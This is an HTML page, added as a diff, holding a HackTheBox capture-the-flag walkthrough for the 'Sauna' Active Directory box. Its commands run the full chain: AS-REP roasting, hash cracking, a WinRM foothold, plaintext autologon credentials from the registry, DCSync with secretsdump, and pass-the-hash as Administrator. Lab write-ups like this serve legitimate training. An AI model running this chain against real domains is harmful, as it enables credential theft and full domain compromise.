@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Sauna — HackTheBox walkthrough</title>
+<meta name="description" content="Walkthrough for the Sauna machine on HackTheBox: AS-REP roasting for initial credentials, WinRM foothold, and DCSync via a service account with replication rights." />
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght@0,9..144,400;0,9..144,500;0,9..144,600;1,9..144,500&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet" />
+<link rel="stylesheet" href="styles/sauna.css" />
+</head>
+<body>
+<div class="wrap">
+
+  <a href="../walkthroughs.html" class="back">back to walkthroughs</a>
+
+  <header class="wt-header">
+    <div class="wt-platform"><span class="dot">●</span> HackTheBox</div>
+    <h1><em>Sauna</em></h1>
+    <div class="wt-meta">
+      <span class="badge medium">Medium</span>
+      <span class="badge tag">windows</span>
+      <span class="badge tag">active-directory</span>
+      <span class="badge tag">as-rep-roasting</span>
+      <span class="badge tag">dcsync</span>
+    </div>
+    <p class="wt-summary">
+      A textbook Active Directory chain and one of the most OSCP-relevant medium boxes.
+      Scrape usernames from the company website, find an account that lacks Kerberos
+      pre-authentication, crack the AS-REP hash, log in over WinRM, discover auto-login
+      credentials in the registry, pivot to a service account that holds replication
+      privileges, and end it with a <code>DCSync</code> for the Administrator hash.
+    </p>
+  </header>
+
+  <nav class="toc">
+    <div class="toc-title">Contents</div>
+    <ol>
+      <li><a href="#recon">Reconnaissance</a></li>
+      <li><a href="#users">Username harvesting</a></li>
+      <li><a href="#asrep">AS-REP roasting</a></li>
+      <li><a href="#foothold">WinRM foothold as fsmith</a></li>
+      <li><a href="#pivot">Pivot — autologon registry creds</a></li>
+      <li><a href="#dcsync">DCSync as svc_loanmgr</a></li>
+      <li><a href="#takeaways">Takeaways</a></li>
+    </ol>
+  </nav>
+
+  <h2 id="recon"><span class="num">01</span> Reconnaissance</h2>
+
+  <pre><code>nmap -sC -sV -p- -T4 10.10.10.175 -oN nmap.txt</code></pre>
+
+  <pre class="output"><code>PORT     STATE SERVICE      VERSION
+53/tcp   open  domain       Microsoft DNS
+80/tcp   open  http         Microsoft IIS httpd 10.0
+88/tcp   open  kerberos-sec Microsoft Windows Kerberos
+135/tcp  open  msrpc        Microsoft Windows RPC
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp  open  ldap         Microsoft Windows Active Directory LDAP
+445/tcp  open  microsoft-ds Windows Server 2016 Standard
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap         Microsoft Windows Active Directory LDAP
+3269/tcp open  tcpwrapped
+5985/tcp open  http         Microsoft HTTPAPI httpd 2.0   (WinRM)
+9389/tcp open  mc-nmf       .NET Message Framing</code></pre>
+
+  <p>Classic domain controller fingerprint: 53, 88, 389, 445, 464, 636, 3268, 3269, 9389.
+  Critically, <strong>5985/tcp</strong> is open — that's WinRM, our foothold port if we
+  land any valid domain credentials. From the LDAP / SMB data we can confirm the domain:</p>
+
+  <pre><code>nmap --script smb-os-discovery -p 445 10.10.10.175</code></pre>
+
+  <pre class="output"><code>|_  FQDN: SAUNA.EGOTISTICAL-BANK.LOCAL</code></pre>
+
+  <p>Domain: <code>EGOTISTICAL-BANK.LOCAL</code>. Hostname: <code>SAUNA</code>.</p>
+
+  <h2 id="users"><span class="num">02</span> Username harvesting</h2>
+
+  <p>Kerberos and LDAP will happily enumerate, but not without authentication here.
+  Pivot to the website on port 80 — the company front page has an "About" section
+  listing team members:</p>
+
+  <pre class="output"><code>Fergus Smith
+Hugo Bear
+Bowie Taylor
+Sophie Driver
+Shaun Coins
+Steven Kerb
+Bradley Greer
+</code></pre>
+
+  <p>Convert those into plausible AD sAMAccountName patterns. The two most common
+  schemes are <em>first.last</em> and <em>flast</em>:</p>
+
+  <pre class="shell"><code>cat &gt; users.txt &lt;&lt;'EOF'
+fsmith
+hbear
+btaylor
+sdriver
+scoins
+skerb
+bgreer
+fergus.smith
+hugo.bear
+bowie.taylor
+sophie.driver
+shaun.coins
+steven.kerb
+bradley.greer
+EOF</code></pre>
+
+  <h2 id="asrep"><span class="num">03</span> AS-REP roasting</h2>
+
+  <p>AS-REP roasting targets accounts where the <em>DONT_REQ_PREAUTH</em> UserAccountControl
+  flag is set. For those users, the KDC will hand out an AS-REP encrypted with the user's
+  password-derived key <em>without requiring pre-authentication</em> — meaning we can
+  request one anonymously and crack it offline.</p>
+
+  <p>Spray the username list with Impacket:</p>
+
+  <pre><code>impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/ \
+  -usersfile users.txt -dc-ip 10.10.10.175 -no-pass -format hashcat</code></pre>
+
+  <pre class="output"><code>$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:1c...[snip]...af</code></pre>
+
+  <p>Exactly one hit — <code>fsmith</code>. Crack with hashcat mode 18200:</p>
+
+  <pre><code>hashcat -m 18200 fsmith.hash /usr/share/wordlists/rockyou.txt --force</code></pre>
+
+  <pre class="output"><code>$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:...: Thestrokes23</code></pre>
+
+  <p>Credentials: <code>fsmith : Thestrokes23</code>.</p>
+
+  <h2 id="foothold"><span class="num">04</span> WinRM foothold as fsmith</h2>
+
+  <p>Validate the credentials against WinRM (port 5985):</p>
+
+  <pre><code>evil-winrm -i 10.10.10.175 -u fsmith -p 'Thestrokes23'</code></pre>
+
+  <pre class="output"><code>*Evil-WinRM* PS C:\Users\FSmith\Documents&gt;</code></pre>
+
+  <p>Grab the user flag:</p>
+
+  <pre><code>type ..\Desktop\user.txt</code></pre>
+
+  <p>Before moving on, run <code>whoami /all</code> and <code>net user fsmith /domain</code>
+  to map group membership. <code>fsmith</code> is a vanilla domain user — no special rights.
+  Time to hunt for a lateral move.</p>
+
+  <h2 id="pivot"><span class="num">05</span> Pivot — autologon registry creds</h2>
+
+  <p>The quickest Windows credential-hunting tool is WinPEAS, but on a WinRM shell a
+  few manual registry queries cover the highest-yield spots. Autologon creds are stored
+  in plaintext under the Winlogon key:</p>
+
+  <pre><code>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"</code></pre>
+
+  <pre class="output"><code>DefaultUserName     REG_SZ    EGOTISTICALBANK\svc_loanmgr
+DefaultPassword     REG_SZ    Moneymakestheworldgoround!
+AutoAdminLogon      REG_SZ    1</code></pre>
+
+  <div class="callout">
+    <strong>Why this works:</strong> <code>AutoAdminLogon</code> requires the password to
+    be stored in the clear under <code>DefaultPassword</code>. Any domain user who can
+    read <code>HKLM\SOFTWARE\...\Winlogon</code> inherits that credential. This is the
+    single most productive registry key on Windows post-exploitation.
+  </div>
+
+  <p>New credentials: <code>svc_loanmgr : Moneymakestheworldgoround!</code>.</p>
+
+  <h2 id="dcsync"><span class="num">06</span> DCSync as svc_loanmgr</h2>
+
+  <p>Before blindly trying DCSync, confirm what <code>svc_loanmgr</code> can do. Run
+  BloodHound ingestion from the Linux side with the fresh creds:</p>
+
+  <pre><code>bloodhound-python -u svc_loanmgr -p 'Moneymakestheworldgoround!' \
+  -d egotistical-bank.local -ns 10.10.10.175 -c All --zip</code></pre>
+
+  <p>Import the zip into BloodHound and mark <code>svc_loanmgr</code> as Owned. The
+  "Find principals with DCSync rights" query returns — unsurprisingly — our service
+  account. It holds <strong>GetChanges</strong> and <strong>GetChangesAll</strong>
+  on the domain object, which together permit directory replication.</p>
+
+  <p>Execute the DCSync with Impacket's <code>secretsdump</code>:</p>
+
+  <pre><code>impacket-secretsdump EGOTISTICAL-BANK.LOCAL/svc_loanmgr:'Moneymakestheworldgoround!'@10.10.10.175</code></pre>
+
+  <pre class="output"><code>[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+Administrator:500:aad3b435...:823452073d75b9d1cf70ebdf86c7f98e:::
+krbtgt:502:aad3b435...:...
+EGOTISTICALBANK.LOCAL\HSmith:1103:...
+...</code></pre>
+
+  <p>The Administrator NT hash is all we need. Pass-the-hash over WinRM:</p>
+
+  <pre><code>evil-winrm -i 10.10.10.175 -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e</code></pre>
+
+  <pre class="output"><code>*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; type ..\Desktop\root.txt</code></pre>
+
+  <h2 id="takeaways"><span class="num">07</span> Takeaways</h2>
+
+  <ul>
+    <li><strong>OSINT is Active Directory recon.</strong> Employee lists on corporate
+    websites are the canonical starting point for AD username generation. Three minutes
+    on an About page saved us rockyou.txt.</li>
+    <li><strong>Always AS-REP before you spray.</strong> On any AD environment, firing
+    <code>GetNPUsers</code> against a username list is cheap, silent, and occasionally
+    devastating. It's the first thing to try after you have any list of candidate users.</li>
+    <li><strong>Autologon registry keys are ubiquitous.</strong> Help desks, test VMs,
+    kiosks, and — apparently — fictional banks all leave plaintext credentials under
+    <code>Winlogon</code>. Check it on every Windows foothold.</li>
+    <li><strong>BloodHound over guessing.</strong> Confirming that <code>svc_loanmgr</code>
+    had replication rights via the graph is more valuable than running
+    <code>secretsdump</code> blindly — understanding <em>why</em> a path works matters
+    for the report.</li>
+  </ul>
+
+  <footer>
+    <div>LOOKY · writeup</div>
+    <div>HackTheBox · Sauna</div>
+  </footer>
+
+</div>
+</body>
+</html>
